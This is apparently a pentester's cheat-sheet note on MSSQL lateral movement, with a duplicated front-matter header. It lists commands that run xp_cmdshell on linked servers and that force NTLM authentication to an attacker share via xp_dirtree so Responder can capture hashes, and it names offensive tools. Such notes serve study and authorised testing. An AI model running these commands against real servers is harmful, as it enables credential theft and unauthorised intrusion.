---
title: 
draft: false
tags:
  - tag1
  - tag2
NeedsReview: true
---

---

title: MSSQL Lateral Movement - Lateral Movement  
draft: false  
tags:

- mssql
    
- lateral-movement
    
- linked-servers
    
- ntlm-relay  
    NeedsReview: false
    

---

> [!summary] Core Concept  
> Pivot across systems by abusing MSSQL linked servers and triggering NTLM authentication to leak or relay credentials.

### 🔸 Through — Navigating Internals → _Lateral Movement_

---

## 🔸 Discover & Abuse Linked Servers

```sql
EXEC sp_linkedservers;
EXEC ('xp_cmdshell whoami') AT [LinkedServer];
```

## 🔸 Steal NetNTLM Hashes

```sql
EXEC xp_dirtree '\\attacker\\share'
```

```bash
sudo responder -I tun0
```

## 🔸 Tools

- Metasploit: `mssql_ntlm_stealer`, `mssql_linkcrawler`
    
- `mssqlpwner`: NTLM relay, link enumeration
    

## 🔗 Related

- [[NTLM Hash Capture]]
    
- [[Impacket SMBServer]]
    
- [[Privilege Escalation - MSSQL]]